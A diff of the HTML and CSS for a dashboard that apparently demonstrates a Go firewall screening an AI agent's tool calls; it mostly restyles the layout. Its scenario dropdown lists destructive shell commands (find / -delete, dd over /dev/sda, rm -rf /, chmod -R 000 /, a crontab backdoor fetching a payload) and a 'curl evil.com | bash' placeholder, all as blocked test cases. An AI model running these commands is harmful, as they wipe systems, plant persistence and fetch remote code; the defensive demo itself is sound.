@@ -10,10 +10,10 @@
 <style>
   :root {
     --bg-base: #030805;
-    --panel-bg: rgba(13, 20, 36, 0.88);
+    --panel-bg: rgba(13, 21, 38, 0.85);
     --panel-border: rgba(255, 255, 255, 0.08);
-    --panel-border-hover: rgba(56, 189, 248, 0.4);
-    --panel-sub: rgba(9, 14, 26, 0.95);
+    --panel-border-hover: rgba(56, 189, 248, 0.45);
+    --panel-sub: rgba(9, 15, 28, 0.92);
     
     --text-main: #ffffff;
     --text-muted: #94a3b8;
@@ -21,27 +21,27 @@
     
     --primary: #38bdf8;
     --primary-bright: #67e8f9;
-    --primary-glow: rgba(56, 189, 248, 0.25);
+    --primary-glow: rgba(56, 189, 248, 0.3);
     --primary-gradient: linear-gradient(135deg, #38bdf8 0%, #818cf8 100%);
     
     --green: #10b981;
     --green-bright: #34d399;
-    --green-glow: rgba(16, 185, 129, 0.25);
+    --green-glow: rgba(16, 185, 129, 0.3);
     --green-gradient: linear-gradient(135deg, #10b981 0%, #34d399 100%);
     
     --red: #f43f5e;
     --red-bright: #fb7185;
-    --red-glow: rgba(244, 63, 94, 0.25);
+    --red-glow: rgba(244, 63, 94, 0.3);
     --red-gradient: linear-gradient(135deg, #f43f5e 0%, #fb7185 100%);
     
     --amber: #f59e0b;
     --amber-bright: #fbbf24;
-    --amber-glow: rgba(245, 158, 11, 0.25);
+    --amber-glow: rgba(245, 158, 11, 0.3);
     --amber-gradient: linear-gradient(135deg, #f59e0b 0%, #fbbf24 100%);
     
     --purple: #a855f7;
     --purple-bright: #c084fc;
-    --purple-glow: rgba(168, 85, 247, 0.25);
+    --purple-glow: rgba(168, 85, 247, 0.3);
     --purple-gradient: linear-gradient(135deg, #a855f7 0%, #c084fc 100%);
 
     --font-head: 'Outfit', sans-serif;
@@ -54,55 +54,55 @@
   body {
     background-color: var(--bg-base);
     background-image: 
-      radial-gradient(circle at 12% 10%, rgba(16, 185, 129, 0.12) 0%, transparent 40%),
-      radial-gradient(circle at 88% 15%, rgba(56, 189, 248, 0.1) 0%, transparent 40%),
-      radial-gradient(circle at 50% 90%, rgba(168, 85, 247, 0.07) 0%, transparent 50%),
+      radial-gradient(circle at 12% 12%, rgba(16, 185, 129, 0.14) 0%, transparent 45%),
+      radial-gradient(circle at 88% 18%, rgba(56, 189, 248, 0.12) 0%, transparent 45%),
+      radial-gradient(circle at 50% 85%, rgba(168, 85, 247, 0.08) 0%, transparent 50%),
       linear-gradient(180deg, #030805 0%, #020403 100%);
     background-attachment: fixed;
     color: var(--text-main);
     font-family: var(--font-body);
-    font-size: 12.5px;
-    line-height: 1.35;
+    font-size: 13px;
+    line-height: 1.45;
     height: 100vh;
     width: 100vw;
-    padding: 10px 16px;
-    overflow: hidden; /* Strict fit-to-screen: no page-level scrolling */
+    padding: 14px 20px;
+    overflow: hidden; /* Clean fit-to-screen without outer scrolling */
   }
 
-  .app-layout {
-    max-width: 1600px;
+  .app-container {
+    max-width: 1680px;
     height: 100%;
     margin: 0 auto;
     display: flex;
     flex-direction: column;
-    gap: 10px;
+    gap: 12px;
   }
 
-  /* Compact Top Header */
+  /* Top Navigation Bar */
   header {
     background: var(--panel-bg);
-    backdrop-filter: blur(20px) saturate(180%);
+    backdrop-filter: blur(20px) saturate(190%);
     -webkit-backdrop-filter: blur(20px);
     border: 1px solid var(--panel-border);
-    border-radius: 10px;
-    padding: 6px 14px;
+    border-radius: 12px;
+    padding: 8px 18px;
     display: flex;
     align-items: center;
     justify-content: space-between;
-    gap: 10px;
+    gap: 12px;
     flex-shrink: 0;
   }
 
   .brand-group {
     display: flex;
     align-items: center;
-    gap: 8px;
+    gap: 10px;
   }
 
   .logo-shield {
-    width: 24px;
-    height: 24px;
-    border-radius: 6px;
+    width: 28px;
+    height: 28px;
+    border-radius: 7px;
     background: linear-gradient(135deg, rgba(16, 185, 129, 0.3), rgba(56, 189, 248, 0.3));
     border: 1px solid rgba(56, 189, 248, 0.5);
     display: flex;
@@ -112,7 +112,7 @@
 
   .brand-title {
     font-family: var(--font-head);
-    font-size: 16px;
+    font-size: 18px;
     font-weight: 800;
     color: #ffffff;
     display: flex;
@@ -123,51 +123,51 @@
 
   .chip-tag {
     font-family: var(--font-mono);
-    font-size: 9.5px;
+    font-size: 10.5px;
     font-weight: 700;
     text-transform: uppercase;
-    padding: 1.5px 7px;
+    padding: 2px 8px;
     border-radius: 999px;
-    background: rgba(56, 189, 248, 0.12);
+    background: rgba(56, 189, 248, 0.15);
     color: #38bdf8;
-    border: 1px solid rgba(56, 189, 248, 0.3);
+    border: 1px solid rgba(56, 189, 248, 0.35);
   }
 
   .nav-actions {
     display: flex;
     align-items: center;
-    gap: 10px;
+    gap: 12px;
   }
 
   .backend-badge {
     font-family: var(--font-mono);
-    font-size: 10.5px;
+    font-size: 11.5px;
     color: #38bdf8;
-    background: rgba(56, 189, 248, 0.08);
-    border: 1px solid rgba(56, 189, 248, 0.22);
-    padding: 3px 8px;
-    border-radius: 5px;
+    background: rgba(56, 189, 248, 0.1);
+    border: 1px solid rgba(56, 189, 248, 0.28);
+    padding: 4px 10px;
+    border-radius: 6px;
     display: flex;
     align-items: center;
-    gap: 5px;
+    gap: 6px;
   }
 
   .live-status {
     display: flex;
     align-items: center;
-    gap: 6px;
-    background: rgba(16, 185, 129, 0.12);
-    border: 1px solid rgba(16, 185, 129, 0.3);
-    padding: 3px 9px;
+    gap: 7px;
+    background: rgba(16, 185, 129, 0.15);
+    border: 1px solid rgba(16, 185, 129, 0.35);
+    padding: 4px 12px;
     border-radius: 999px;
     color: #34d399;
-    font-size: 10.5px;
+    font-size: 11.5px;
     font-weight: 700;
   }
 
   .radar-dot {
-    width: 6px;
-    height: 6px;
+    width: 7px;
+    height: 7px;
     border-radius: 50%;
     background: #34d399;
     position: relative;
@@ -190,29 +190,76 @@
   .home-link {
     color: var(--text-muted);
     text-decoration: none;
-    font-size: 11.5px;
+    font-size: 12.5px;
     font-weight: 600;
-    padding: 3px 8px;
-    border-radius: 5px;
+    padding: 4px 10px;
+    border-radius: 6px;
     transition: all 0.15s ease;
   }
-  .home-link:hover { color: #fff; background: rgba(255,255,255,0.05); }
+  .home-link:hover { color: #fff; background: rgba(255,255,255,0.06); }
 
-  /* Compact Command Control & 2D Pipeline Console */
-  .cockpit-card {
-    background: var(--panel-bg);
-    backdrop-filter: blur(20px) saturate(180%);
-    -webkit-backdrop-filter: blur(20px);
-    border: 1px solid var(--panel-border);
-    border-radius: 12px;
-    padding: 10px 14px;
+  /* 2-Column Master Grid Layout */
+  .master-grid {
+    display: grid;
+    grid-template-columns: 1.22fr 0.98fr;
+    gap: 14px;
+    flex: 1;
+    min-height: 0; /* Prevents container overflow */
+  }
+
+  /* Left Column: Command & Decision Center */
+  .col-left {
     display: flex;
     flex-direction: column;
-    gap: 8px;
+    gap: 14px;
+    min-height: 0;
+  }
+
+  /* Right Column: Metrics & Telemetry Stream */
+  .col-right {
+    display: flex;
+    flex-direction: column;
+    gap: 14px;
+    min-height: 0;
+  }
+
+  /* Shared Card Styling */
+  .card-panel {
+    background: var(--panel-bg);
+    backdrop-filter: blur(20px) saturate(190%);
+    -webkit-backdrop-filter: blur(20px);
+    border: 1px solid var(--panel-border);
+    border-radius: 14px;
+    padding: 14px 16px;
+    display: flex;
+    flex-direction: column;
+    gap: 10px;
+    position: relative;
+  }
+
+  /* Command & 2D Pipeline Flow Card */
+  .control-card {
     flex-shrink: 0;
   }
 
-  .control-row {
+  .card-title-row {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    gap: 8px;
+  }
+
+  .card-title {
+    font-family: var(--font-head);
+    font-size: 14px;
+    font-weight: 700;
+    color: #fff;
+    display: flex;
+    align-items: center;
+    gap: 6px;
+  }
+
+  .control-input-row {
     display: flex;
     align-items: center;
     gap: 8px;
@@ -222,50 +269,48 @@
     flex: 1;
     background: var(--panel-sub);
     border: 1px solid var(--panel-border);
-    border-radius: 7px;
-    padding: 6px 10px;
+    border-radius: 8px;
+    padding: 8px 12px;
     color: #fff;
     font-family: var(--font-mono);
-    font-size: 11.5px;
+    font-size: 12px;
     outline: none;
     cursor: pointer;
   }
-
   .script-select:focus {
     border-color: var(--primary);
-    box-shadow: 0 0 10px rgba(56, 189, 248, 0.2);
+    box-shadow: 0 0 12px rgba(56, 189, 248, 0.25);
   }
-
   .script-select option {
     background: #0b1120;
     color: #fff;
   }
 
   .custom-cmd-input {
-    flex: 0.8;
+    flex: 1;
     background: var(--panel-sub);
     border: 1px solid var(--panel-border);
-    border-radius: 7px;
-    padding: 6px 10px;
+    border-radius: 8px;
+    padding: 8px 12px;
     color: #fff;
     font-family: var(--font-mono);
-    font-size: 11.5px;
+    font-size: 12px;
     outline: none;
     display: none;
   }
   .custom-cmd-input:focus {
     border-color: var(--primary);
-    box-shadow: 0 0 10px rgba(56, 189, 248, 0.2);
+    box-shadow: 0 0 12px rgba(56, 189, 248, 0.25);
   }
 
   .btn-mode-toggle {
     background: var(--panel-sub);
     border: 1px solid var(--panel-border);
     color: var(--text-muted);
-    font-size: 11px;
+    font-size: 11.5px;
     font-weight: 600;
-    padding: 6px 10px;
-    border-radius: 7px;
+    padding: 8px 12px;
+    border-radius: 8px;
     cursor: pointer;
     white-space: nowrap;
     transition: all 0.15s ease;
@@ -280,20 +325,19 @@
     color: #041019;
     font-family: var(--font-head);
     font-weight: 800;
-    font-size: 12px;
-    padding: 7px 16px;
-    border-radius: 7px;
+    font-size: 13px;
+    padding: 8px 18px;
+    border-radius: 8px;
     border: none;
     cursor: pointer;
     display: flex;
     align-items: center;
-    gap: 6px;
-    box-shadow: 0 0 14px rgba(16, 185, 129, 0.3);
+    gap: 7px;
+    box-shadow: 0 0 16px rgba(16, 185, 129, 0.35);
     white-space: nowrap;
     transition: transform 0.15s ease, box-shadow 0.15s ease;
   }
-
-  .btn-fire:hover { transform: translateY(-1px); box-shadow: 0 0 20px rgba(16, 185, 129, 0.45); }
+  .btn-fire:hover { transform: translateY(-1px); box-shadow: 0 0 22px rgba(16, 185, 129, 0.5); }
   .btn-fire:active { transform: translateY(0); }
 
   /* 2D Visual Pipeline Flow */
@@ -301,8 +345,8 @@
     display: flex;
     align-items: center;
     justify-content: space-between;
-    gap: 5px;
-    padding: 2px 0;
+    gap: 6px;
+    padding-top: 4px;
   }
 
   .pipe-node {
@@ -310,8 +354,8 @@
     min-width: 0;
     background: var(--panel-sub);
     border: 1px solid var(--panel-border);
-    border-radius: 8px;
-    padding: 6px 4px;
+    border-radius: 9px;
+    padding: 8px 6px;
     display: flex;
     flex-direction: column;
     align-items: center;
@@ -322,130 +366,46 @@
 
   .pipe-node.active {
     border-color: var(--primary);
-    box-shadow: 0 0 14px rgba(56, 189, 248, 0.4), inset 0 0 6px rgba(56, 189, 248, 0.2);
+    box-shadow: 0 0 16px rgba(56, 189, 248, 0.45), inset 0 0 6px rgba(56, 189, 248, 0.2);
     transform: translateY(-2px);
   }
 
   .pipe-node.blocked {
     border-color: var(--red);
-    box-shadow: 0 0 14px rgba(244, 63, 94, 0.5), inset 0 0 6px rgba(244, 63, 94, 0.25);
+    box-shadow: 0 0 16px rgba(244, 63, 94, 0.55), inset 0 0 6px rgba(244, 63, 94, 0.25);
     transform: translateY(-2px);
   }
 
   .pipe-node.passed {
     border-color: var(--green);
-    box-shadow: 0 0 14px rgba(16, 185, 129, 0.4);
+    box-shadow: 0 0 16px rgba(16, 185, 129, 0.45);
   }
 
   .pipe-node.review {
     border-color: var(--amber);
-    box-shadow: 0 0 14px rgba(245, 158, 11, 0.5);
+    box-shadow: 0 0 16px rgba(245, 158, 11, 0.55);
     transform: translateY(-2px);
   }
 
-  .node-icon {
-    font-size: 13px;
-    line-height: 1;
-  }
-
-  .node-name {
-    font-family: var(--font-head);
-    font-size: 11px;
-    font-weight: 700;
-    white-space: nowrap;
-  }
-
-  .node-role {
-    font-size: 9px;
-    color: var(--text-dim);
-    white-space: nowrap;
-    overflow: hidden;
-    text-overflow: ellipsis;
-    max-width: 95%;
-  }
+  .node-icon { font-size: 15px; line-height: 1.1; }
+  .node-name { font-family: var(--font-head); font-size: 12px; font-weight: 700; white-space: nowrap; }
+  .node-role { font-size: 9.5px; color: var(--text-dim); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; max-width: 95%; }
 
   .flow-arrow {
     color: var(--text-dim);
-    font-size: 12px;
+    font-size: 13px;
     transition: all 0.2s ease;
     flex-shrink: 0;
   }
-
   .flow-arrow.active {
     color: var(--primary-bright);
-    filter: drop-shadow(0 0 5px var(--primary));
-    transform: scale(1.25);
+    filter: drop-shadow(0 0 6px var(--primary));
+    transform: scale(1.3);
   }
 
-  /* Compact Metric Cards Strip */
-  .metrics-strip {
-    display: grid;
-    grid-template-columns: repeat(5, 1fr);
-    gap: 8px;
-    flex-shrink: 0;
-  }
-
-  .metric-box {
-    background: var(--panel-bg);
-    border: 1px solid var(--panel-border);
-    border-radius: 9px;
-    padding: 6px 12px;
-    display: flex;
-    flex-direction: column;
-    justify-content: center;
-    position: relative;
-    overflow: hidden;
-  }
-
-  .metric-box::before {
-    content: '';
-    position: absolute;
-    top: 0; left: 0; right: 0;
-    height: 2px;
-    background: var(--primary-gradient);
-  }
-
-  .metric-box.ok::before { background: var(--green-gradient); }
-  .metric-box.bad::before { background: var(--red-gradient); }
-  .metric-box.purple::before { background: var(--purple-gradient); }
-  .metric-box.warn::before { background: var(--amber-gradient); }
-
-  .metric-lbl {
-    font-size: 9.5px;
-    font-weight: 700;
-    text-transform: uppercase;
-    color: var(--text-muted);
-    letter-spacing: 0.02em;
-  }
-
-  .metric-val {
-    font-family: var(--font-head);
-    font-size: 18px;
-    font-weight: 800;
-    color: #fff;
-    line-height: 1.1;
-  }
-
-  /* Main Two-Column Split Workspace (Fills Remaining Viewport Exactly) */
-  .main-split {
-    display: grid;
-    grid-template-columns: 1.12fr 0.88fr;
-    gap: 10px;
-    flex: 1;
-    min-height: 0; /* Critical: allows flex child to scroll internally without overflowing viewport */
-  }
-
-  /* Left Panel: Active Decision Inspector */
+  /* Live Decision Inspector Card (Fills remaining height in left column) */
   .inspector-card {
-    background: var(--panel-bg);
-    backdrop-filter: blur(20px) saturate(180%);
-    -webkit-backdrop-filter: blur(20px);
-    border: 1px solid var(--panel-border);
-    border-radius: 12px;
-    padding: 10px 14px;
-    display: flex;
-    flex-direction: column;
-    gap: 8px;
+    flex: 1;
     min-height: 0;
     overflow: hidden;
   }
@@ -454,86 +414,71 @@
     display: flex;
     align-items: center;
     justify-content: space-between;
-    padding-bottom: 6px;
-    border-bottom: 1px solid rgba(255, 255, 255, 0.06);
+    padding-bottom: 8px;
+    border-bottom: 1px solid rgba(255, 255, 255, 0.08);
     flex-shrink: 0;
   }
 
   .verdict-badge {
     font-family: var(--font-mono);
-    font-size: 10.5px;
+    font-size: 11.5px;
     font-weight: 800;
-    padding: 2.5px 9px;
-    border-radius: 5px;
+    padding: 3px 12px;
+    border-radius: 6px;
     text-transform: uppercase;
   }
-
-  .verdict-badge.block { background: rgba(244, 63, 94, 0.2); color: #fb7185; border: 1px solid rgba(244, 63, 94, 0.4); }
-  .verdict-badge.rate_limited { background: rgba(244, 63, 94, 0.2); color: #fb7185; border: 1px solid rgba(244, 63, 94, 0.4); }
-  .verdict-badge.allow { background: rgba(16, 185, 129, 0.2); color: #34d399; border: 1px solid rgba(16, 185, 129, 0.4); }
-  .verdict-badge.review { background: rgba(245, 158, 11, 0.2); color: #fbbf24; border: 1px solid rgba(245, 158, 11, 0.4); }
+  .verdict-badge.block { background: rgba(244, 63, 94, 0.22); color: #fb7185; border: 1px solid rgba(244, 63, 94, 0.45); }
+  .verdict-badge.rate_limited { background: rgba(244, 63, 94, 0.22); color: #fb7185; border: 1px solid rgba(244, 63, 94, 0.45); }
+  .verdict-badge.allow { background: rgba(16, 185, 129, 0.22); color: #34d399; border: 1px solid rgba(16, 185, 129, 0.45); }
+  .verdict-badge.review { background: rgba(245, 158, 11, 0.22); color: #fbbf24; border: 1px solid rgba(245, 158, 11, 0.45); }
 
   .breakdown-grid {
     display: grid;
     grid-template-columns: repeat(4, 1fr);
-    gap: 6px;
+    gap: 8px;
     flex-shrink: 0;
   }
 
   .breakdown-item {
     background: var(--panel-sub);
     border: 1px solid var(--panel-border);
-    border-radius: 7px;
-    padding: 5px 8px;
+    border-radius: 8px;
+    padding: 6px 10px;
     display: flex;
     flex-direction: column;
-    gap: 1px;
+    gap: 2px;
   }
 
-  .item-lbl {
-    font-size: 9px;
-    color: var(--text-dim);
-    font-weight: 700;
-    text-transform: uppercase;
-  }
-
-  .item-val {
-    font-family: var(--font-mono);
-    font-size: 11px;
-    color: #e2e8f0;
-    white-space: nowrap;
-    overflow: hidden;
-    text-overflow: ellipsis;
-  }
+  .item-lbl { font-size: 9.5px; color: var(--text-dim); font-weight: 700; text-transform: uppercase; }
+  .item-val { font-family: var(--font-mono); font-size: 12px; color: #e2e8f0; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
 
   .rationale-box {
     background: var(--panel-sub);
     border: 1px solid var(--panel-border);
     border-left: 3px solid var(--primary);
-    border-radius: 7px;
-    padding: 6px 10px;
-    font-size: 11.5px;
+    border-radius: 8px;
+    padding: 8px 12px;
+    font-size: 12.5px;
     color: #e2e8f0;
     flex-shrink: 0;
   }
 
   .hitl-box {
     display: none;
-    background: rgba(245, 158, 11, 0.12);
-    border: 1px solid rgba(245, 158, 11, 0.35);
-    border-radius: 7px;
-    padding: 6px 10px;
+    background: rgba(245, 158, 11, 0.14);
+    border: 1px solid rgba(245, 158, 11, 0.4);
+    border-radius: 8px;
+    padding: 8px 12px;
     align-items: center;
     justify-content: space-between;
     gap: 8px;
     flex-shrink: 0;
   }
-
   .btn-hitl {
-    padding: 3px 9px;
-    border-radius: 4px;
+    padding: 4px 12px;
+    border-radius: 5px;
     font-weight: 700;
-    font-size: 10.5px;
+    font-size: 11.5px;
     border: none;
     cursor: pointer;
   }
@@ -541,7 +486,7 @@
   .code-viewer {
     background: var(--panel-sub);
     border: 1px solid var(--panel-border);
-    border-radius: 7px;
+    border-radius: 8px;
     overflow: hidden;
     flex: 1;
     min-height: 0;
@@ -550,11 +495,11 @@
   }
 
   .code-viewer-head {
-    background: rgba(255, 255, 255, 0.02);
+    background: rgba(255, 255, 255, 0.03);
     border-bottom: 1px solid var(--panel-border);
-    padding: 4px 8px;
+    padding: 6px 10px;
     font-family: var(--font-mono);
-    font-size: 9.5px;
+    font-size: 10.5px;
     color: var(--text-dim);
     display: flex;
     justify-content: space-between;
@@ -562,27 +507,69 @@
   }
 
   pre.code-viewer-body {
-    padding: 6px 8px;
+    padding: 8px 12px;
     font-family: var(--font-mono);
-    font-size: 10.5px;
+    font-size: 12px;
     color: #e2e8f0;
     overflow: auto;
     flex: 1;
     margin: 0;
-    line-height: 1.35;
+    line-height: 1.4;
   }
 
-  /* Right Panel: Telemetry Feed */
-  .telemetry-card {
+  /* Right Column: 2x2 Metric Cards Grid (Moved UP into top row) */
+  .metrics-grid {
+    display: grid;
+    grid-template-columns: repeat(2, 1fr);
+    gap: 10px;
+    flex-shrink: 0;
+  }
+
+  .metric-card {
     background: var(--panel-bg);
-    backdrop-filter: blur(20px) saturate(180%);
-    -webkit-backdrop-filter: blur(20px);
     border: 1px solid var(--panel-border);
     border-radius: 12px;
     padding: 10px 14px;
     display: flex;
     flex-direction: column;
-    gap: 8px;
+    justify-content: center;
+    position: relative;
+    overflow: hidden;
+  }
+
+  .metric-card::before {
+    content: '';
+    position: absolute;
+    top: 0; left: 0; right: 0;
+    height: 2.5px;
+    background: var(--primary-gradient);
+  }
+
+  .metric-card.ok::before { background: var(--green-gradient); }
+  .metric-card.bad::before { background: var(--red-gradient); }
+  .metric-card.purple::before { background: var(--purple-gradient); }
+  .metric-card.warn::before { background: var(--amber-gradient); }
+
+  .metric-lbl {
+    font-size: 10.5px;
+    font-weight: 700;
+    text-transform: uppercase;
+    color: var(--text-muted);
+    letter-spacing: 0.02em;
+  }
+
+  .metric-val {
+    font-family: var(--font-head);
+    font-size: 22px;
+    font-weight: 800;
+    color: #fff;
+    line-height: 1.15;
+    margin-top: 2px;
+  }
+
+  /* Right Column: Live Telemetry Audit Stream Card (Fills remaining height) */
+  .telemetry-card {
+    flex: 1;
     min-height: 0;
     overflow: hidden;
   }
@@ -591,53 +578,52 @@
     display: flex;
     align-items: center;
     justify-content: space-between;
-    padding-bottom: 6px;
-    border-bottom: 1px solid rgba(255, 255, 255, 0.06);
+    padding-bottom: 8px;
+    border-bottom: 1px solid rgba(255, 255, 255, 0.08);
     flex-shrink: 0;
   }
 
   .feed-filters {
     display: flex;
-    gap: 4px;
+    gap: 5px;
   }
 
   .filter-btn {
     background: var(--panel-sub);
     border: 1px solid var(--panel-border);
-    border-radius: 4px;
-    padding: 2px 7px;
-    font-size: 10px;
+    border-radius: 5px;
+    padding: 3px 9px;
+    font-size: 11px;
     color: var(--text-muted);
     cursor: pointer;
     transition: all 0.15s ease;
   }
-
   .filter-btn.active, .filter-btn:hover {
     background: rgba(56, 189, 248, 0.15);
-    border-color: rgba(56, 189, 248, 0.4);
+    border-color: rgba(56, 189, 248, 0.45);
     color: #38bdf8;
   }
 
   .telemetry-table {
     display: flex;
     flex-direction: column;
-    gap: 4px;
+    gap: 5px;
     overflow-y: auto;
     flex: 1;
     min-height: 0;
-    padding-right: 2px;
+    padding-right: 3px;
   }
 
   .feed-row {
     background: var(--panel-sub);
     border: 1px solid var(--panel-border);
-    border-radius: 5px;
-    padding: 5px 8px;
+    border-radius: 7px;
+    padding: 7px 10px;
     display: flex;
     align-items: center;
     justify-content: space-between;
-    gap: 6px;
-    font-size: 11px;
+    gap: 8px;
+    font-size: 12px;
     animation: row-in 0.22s ease;
     flex-shrink: 0;
   }
@@ -649,18 +635,17 @@
 
   .feed-tag {
     font-family: var(--font-mono);
-    font-size: 9px;
+    font-size: 9.5px;
     font-weight: 700;
     text-transform: uppercase;
-    padding: 1.5px 5px;
-    border-radius: 3px;
+    padding: 2px 6px;
+    border-radius: 4px;
     flex-shrink: 0;
   }
-
-  .feed-tag.blocked { background: rgba(244, 63, 94, 0.2); color: #fb7185; }
-  .feed-tag.response { background: rgba(16, 185, 129, 0.2); color: #34d399; }
-  .feed-tag.redacted { background: rgba(168, 85, 247, 0.2); color: #c084fc; }
-  .feed-tag.review { background: rgba(245, 158, 11, 0.2); color: #fbbf24; }
+  .feed-tag.blocked { background: rgba(244, 63, 94, 0.22); color: #fb7185; }
+  .feed-tag.response { background: rgba(16, 185, 129, 0.22); color: #34d399; }
+  .feed-tag.redacted { background: rgba(168, 85, 247, 0.22); color: #c084fc; }
+  .feed-tag.review { background: rgba(245, 158, 11, 0.22); color: #fbbf24; }
 
   .feed-tool {
     font-family: var(--font-mono);
@@ -672,15 +657,15 @@
   .feed-args {
     font-family: var(--font-mono);
     color: var(--text-dim);
-    font-size: 10px;
+    font-size: 11px;
     white-space: nowrap;
     overflow: hidden;
     text-overflow: ellipsis;
-    max-width: 220px;
+    max-width: 250px;
   }
 
-  /* Custom scrollbar styling */
-  ::-webkit-scrollbar { width: 5px; height: 5px; }
+  /* Custom scrollbars */
+  ::-webkit-scrollbar { width: 6px; height: 6px; }
   ::-webkit-scrollbar-track { background: transparent; }
   ::-webkit-scrollbar-thumb { background: rgba(255, 255, 255, 0.15); border-radius: 999px; }
   ::-webkit-scrollbar-thumb:hover { background: rgba(255, 255, 255, 0.3); }
@@ -688,13 +673,13 @@
 </head>
 <body>
 
-<div class="app-layout">
+<div class="app-container">
 
-  <!-- Compact Top Header -->
+  <!-- Top Navigation Header -->
   <header>
     <div class="brand-group">
       <div class="logo-shield">
-        <svg width="15" height="15" viewBox="0 0 24 24" fill="none">
+        <svg width="17" height="17" viewBox="0 0 24 24" fill="none">
           <path d="M12 2 4 5v6c0 5 3.4 9.6 8 11 4.6-1.4 8-6 8-11V5l-8-3Z" stroke="#38bdf8" stroke-width="2" stroke-linejoin="round"/>
           <path d="m9 12 2 2 4-4" stroke="#34d399" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
         </svg>
@@ -716,198 +701,208 @@
     </div>
   </header>
 
-  <!-- Interactive Control & 2D Pipeline Console -->
-  <div class="cockpit-card">
-    <div class="control-row">
-      <select class="script-select" id="script-picker" onchange="onSelectScenario()">
-        <optgroup label="🚨 Semantic Gap Attacks (Catastrophic effect without rm -rf keyword)">
-          <option value="sem-1">1. find / -delete (Wipes root filesystem via Unix find expression)</option>
-          <option value="sem-2">2. dd if=/dev/zero of=/dev/sda bs=1M (Overwrites master partition table)</option>
-          <option value="sem-3">3. python3 -c "import shutil; shutil.rmtree('/home')" (Python destructive syntax)</option>
-          <option value="sem-4">4. (crontab -l; echo '* * * * * curl payload') | crontab - (Backdoor persistence)</option>
-          <option value="sem-5">5. chmod -R 000 / (Locks out all filesystem access &amp; permissions)</option>
-        </optgroup>
-        <optgroup label="🚫 Tier 0 Static Keyword Regex Guards">
-          <option value="reg-1">6. rm -rf / --no-preserve-root (Blocked by arg_deny_pattern)</option>
-          <option value="reg-2">7. del /s C:\Windows\System32 (Blocked by Windows delete pattern)</option>
-          <option value="reg-3">8. shutdown -h now (Blocked by shutdown rule)</option>
-        </optgroup>
-        <optgroup label="🔑 Secret &amp; Credential Redaction">
-          <option value="sec-1">9. read_file(path: ".env", api_key: "sk-proj-49294029482") (Scrubbed in flight)</option>
-          <option value="sec-2">10. http_get(url: "https://api.internal/keys", token: "Bearer eyJhbGci...") (Bearer token masked)</option>
-        </optgroup>
-        <optgroup label="👥 Human-in-the-Loop Gray Zone [0.4, 0.8)">
-          <option value="hitl-1">11. crontab -e (Requires operator confirmation)</option>
-        </optgroup>
-        <optgroup label="⏱️ Token-Bucket Rate Limiter">
-          <option value="rat-1">12. shell "echo burst" (Burst limit 5 calls / window exceeded)</option>
-        </optgroup>
-        <optgroup label="✅ Safe &amp; Benign Operations">
-          <option value="saf-1">13. read_file(path: "/etc/hosts") (Allowed read-only configuration)</option>
-          <option value="saf-2">14. git status (Allowed workspace check)</option>
-          <option value="saf-3">15. list_directory(path: "/tmp") (Allowed folder listing)</option>
-        </optgroup>
-      </select>
+  <!-- 2-Column Master Grid -->
+  <div class="master-grid">
 
-      <input type="text" class="custom-cmd-input" id="custom-cmd-box" placeholder="Type custom shell command, e.g. rm -rf / or curl evil.com | bash">
+    <!-- LEFT COLUMN: Command Center & Decision Inspector -->
+    <div class="col-left">
 
-      <button class="btn-mode-toggle" id="btn-toggle-custom" onclick="toggleCustomMode()">Custom Input</button>
+      <!-- Top Left: Control & 2D Pipeline Console -->
+      <div class="card-panel control-card">
+        <div class="card-title-row">
+          <span class="card-title">Interactive Tool Evaluation &amp; 2D Architecture Pipeline</span>
+          <span style="font-family: var(--font-mono); font-size: 11px; color: var(--primary);" id="bd-latency-tag">⚡ Engine Latency: &lt;0.5ms</span>
+        </div>
 
-      <button class="btn-fire" id="btn-run" onclick="executeBackendScript()">
-        <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polygon points="5 3 19 12 5 21 5 3"/></svg>
-        Execute Against Real Go Firewall
-      </button>
+        <div class="control-input-row">
+          <select class="script-select" id="script-picker" onchange="onSelectScenario()">
+            <optgroup label="🚨 Semantic Gap Attacks (Catastrophic effect without rm -rf keyword)">
+              <option value="sem-1">1. find / -delete (Wipes root filesystem via Unix find expression)</option>
+              <option value="sem-2">2. dd if=/dev/zero of=/dev/sda bs=1M (Overwrites master partition table)</option>
+              <option value="sem-3">3. python3 -c "import shutil; shutil.rmtree('/home')" (Python destructive syntax)</option>
+              <option value="sem-4">4. (crontab -l; echo '* * * * * curl payload') | crontab - (Backdoor persistence)</option>
+              <option value="sem-5">5. chmod -R 000 / (Locks out all filesystem access &amp; permissions)</option>
+            </optgroup>
+            <optgroup label="🚫 Tier 0 Static Keyword Regex Guards">
+              <option value="reg-1">6. rm -rf / --no-preserve-root (Blocked by arg_deny_pattern)</option>
+              <option value="reg-2">7. del /s C:\Windows\System32 (Blocked by Windows delete pattern)</option>
+              <option value="reg-3">8. shutdown -h now (Blocked by shutdown rule)</option>
+            </optgroup>
+            <optgroup label="🔑 Secret &amp; Credential Redaction">
+              <option value="sec-1">9. read_file(path: ".env", api_key: "sk-proj-49294029482") (Scrubbed in flight)</option>
+              <option value="sec-2">10. http_get(url: "https://api.internal/keys", token: "Bearer eyJhbGci...") (Bearer token masked)</option>
+            </optgroup>
+            <optgroup label="👥 Human-in-the-Loop Gray Zone [0.4, 0.8)">
+              <option value="hitl-1">11. crontab -e (Requires operator confirmation)</option>
+            </optgroup>
+            <optgroup label="⏱️ Token-Bucket Rate Limiter">
+              <option value="rat-1">12. shell "echo burst" (Burst limit 5 calls / window exceeded)</option>
+            </optgroup>
+            <optgroup label="✅ Safe &amp; Benign Operations">
+              <option value="saf-1">13. read_file(path: "/etc/hosts") (Allowed read-only configuration)</option>
+              <option value="saf-2">14. git status (Allowed workspace check)</option>
+              <option value="saf-3">15. list_directory(path: "/tmp") (Allowed folder listing)</option>
+            </optgroup>
+          </select>
+
+          <input type="text" class="custom-cmd-input" id="custom-cmd-box" placeholder="Type custom shell command, e.g. rm -rf / or curl evil.com | bash">
+
+          <button class="btn-mode-toggle" id="btn-toggle-custom" onclick="toggleCustomMode()">Custom Input</button>
+
+          <button class="btn-fire" id="btn-run" onclick="executeBackendScript()">
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polygon points="5 3 19 12 5 21 5 3"/></svg>
+            Execute Real Go Firewall
+          </button>
+        </div>
+
+        <!-- 2D Pipeline Flow Diagram -->
